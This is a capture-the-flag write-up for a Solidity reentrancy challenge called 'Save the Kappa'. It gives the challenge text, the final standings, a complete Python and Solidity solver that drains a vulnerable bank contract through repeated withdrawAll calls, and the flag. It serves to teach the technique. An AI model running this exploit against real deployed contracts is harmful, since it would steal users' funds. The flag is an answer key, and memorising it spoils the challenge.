# Save the Kappa : blockchain

I absolutely love kappa.  
Therefore, taking inspiration from “Kappa's River Drift”(This is a proverb meaning “Even Homer nods”.), I devised a challenge where helping a kappa results in receiving cucumbers—their favourite food—as a token of gratitude.  
This challenge was created for author's own study.  

Special thanks for karriho. He helped establish this as a legitimate challenge and contributed to creating `solver.py`.

## Result
Solved: 40  
Points: 344

1st: Satoki(BunkyoWesterns)  
2nd: Quriosity(sknb)  
3rd: CEO OF FFF(Lil L3ak)

## Challenge
Kappa always swim in chains. However, due to a mysterious force, one kappa was swept away by the river. Rescue the kappa that was swept away and receive a treasure as a reward!  
`nc chal1.fwectf.com 8020`

Difficulty: medium  
Attachment:  
・ [VulnerableBank.sol](VulnerableBank.sol)  
・ [Setup.sol](Setup.sol)

## writeup

Knowing the following will enable you to solve it:
* reentrancy, etc.

Below is the executable code:
```python solver.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
save_the_kappa / solver.py
- Reentrancy(リエントランシー)攻撃で VulnerableBank(withdrawAll脆弱) を空にする。
- EIP-1559 / legacy 手数料の両対応（web3.py v5/v6 どちらでも動く）。
"""

import os
import sys
from web3 import Web3
from eth_account import Account
from solcx import compile_standard, install_solc, set_solc_version

RPC_URL   = os.getenv("RPC_URL", "http://127.0.0.1:8545")
BANK_ADDR = os.getenv("BANK_ADDR")
PLAYER_PK = os.getenv("PLAYER_PRIV")
STAKE_ETH = float(os.getenv("STAKE_ETH", "0.2"))  # 攻撃の初期デポジット(ETH)

if not BANK_ADDR or not PLAYER_PK:
    print("[!] BANK_ADDR / PLAYER_PRIV を環境変数で指定してください。")
    sys.exit(1)
if not PLAYER_PK.startswith("0x"):
    PLAYER_PK = "0x" + PLAYER_PK

BANK_ADDR = Web3.to_checksum_address(BANK_ADDR)

ATTACKER_SOURCE = r"""
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IBank {
    function deposit() external payable;
    function withdrawAll() external;
}

contract ReentrancyKappa {
    IBank public bank;
    address payable public owner;
    uint256 public stake;

    constructor(address _bank) {
        bank = IBank(_bank);
        owner = payable(msg.sender);
    }

    function pwn() external payable {
        require(msg.sender == owner, "only owner");
        require(msg.value > 0, "no stake");
        stake = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdrawAll();
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdrawAll();
        }
    }

    function drain() external {
        require(msg.sender == owner, "only owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}
"""

def dual_raw_tx(signed):
    """web3.py v5(rawTransaction) / v6(raw_transaction) 両対応"""
    return getattr(signed, "rawTransaction", None) or getattr(signed, "raw_transaction", None)

def fill_fees(w3: Web3, tx: dict) -> dict:
    """
    チェーンがEIP-1559対応なら maxFeePerGas / maxPriorityFeePerGas を入れる。
    非対応なら gasPrice を入れる。
    既にどちらかが入っている場合は触らない。
    """
    # すでにfee指定があるなら何もしない
    if any(k in tx for k in ("maxFeePerGas", "maxPriorityFeePerGas", "gasPrice")):
        return tx

    latest = w3.eth.get_block("latest")
    base_fee = latest.get("baseFeePerGas")
    if base_fee is not None:
        # EIP-1559
        try:
            max_priority = w3.eth.max_priority_fee  # web3 v6: property
        except Exception:
            # フォールバック: 2 gwei
            max_priority = w3.to_wei(2, "gwei")
        max_fee = base_fee * 2 + max_priority
        tx["maxPriorityFeePerGas"] = int(max_priority)
        tx["maxFeePerGas"] = int(max_fee)
    else:
        # legacy
        tx["gasPrice"] = int(w3.eth.gas_price)
    return tx

def send_raw(w3: Web3, acct, tx: dict):
    """
    ローカル署名送信（EIP-1559/legacy自動対応）
    - nonce/chainId/gas を適切に埋める
    """
    tx = dict(tx)  # copy
    tx.setdefault("from", acct.address)
    tx.setdefault("chainId", w3.eth.chain_id)
    tx.setdefault("nonce", w3.eth.get_transaction_count(acct.address))
    tx.setdefault("gas", 1_500_000)
    tx = fill_fees(w3, tx)

    signed = acct.sign_transaction(tx)
    raw = dual_raw_tx(signed)
    txh = w3.eth.send_raw_transaction(raw)
    rcpt = w3.eth.wait_for_transaction_receipt(txh)
    if rcpt.get("status", 0) != 1:
        raise RuntimeError(f"tx failed: {rcpt}")
    return rcpt

def main():
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), f"not connected to {RPC_URL}"
    acct = Account.from_key(PLAYER_PK)
    print(f"[+] player: {acct.address}")

    # コンパイル
    install_solc("0.8.26")
    set_solc_version("0.8.26")
    build = compile_standard({
        "language": "Solidity",
        "sources": {"Attacker.sol": {"content": ATTACKER_SOURCE}},
        "settings": {
            "optimizer": {"enabled": True, "runs": 200},
            "outputSelection": {"*": {"*": ["abi", "evm.bytecode.object"]}},
        },
    })
    abi = build["contracts"]["Attacker.sol"]["ReentrancyKappa"]["abi"]
    bytecode = build["contracts"]["Attacker.sol"]["ReentrancyKappa"]["evm"]["bytecode"]["object"]

    # 攻撃コントラクト deploy
    Attacker = w3.eth.contract(abi=abi, bytecode=bytecode)
    tx = Attacker.constructor(BANK_ADDR).build_transaction({"from": acct.address})
    rc = send_raw(w3, acct, tx)
    attacker_addr = Web3.to_checksum_address(rc["contractAddress"])
    print(f"[+] attacker: {attacker_addr}")
    attacker = w3.eth.contract(address=attacker_addr, abi=abi)

    # 攻撃前の残高
    before = w3.eth.get_balance(BANK_ADDR)
    print(f"[+] bank before: {w3.from_wei(before, 'ether')} ETH")

    # 攻撃開始（pwn + deposit）
    stake_wei = w3.to_wei(STAKE_ETH, "ether")
    tx = attacker.functions.pwn().build_transaction({"from": acct.address, "value": stake_wei})
    rc = send_raw(w3, acct, tx)
    print("[+] reentrancy done.")

    # 回収
    tx = attacker.functions.drain().build_transaction({"from": acct.address})
    send_raw(w3, acct, tx)

    after = w3.eth.get_balance(BANK_ADDR)
    print(f"[+] bank after : {w3.from_wei(after, 'ether')} ETH")
    if after == 0:
        print("[+] success: drained. Now press '3' in nc to get the flag.")
    else:
        print("[!] still not zero. Increase STAKE_ETH or gas if needed, and confirm Bank is withdrawAll-type.")

if __name__ == "__main__":
    main()
```

## flag

`fwectf{7h15_15_7h3_cucumber!}`
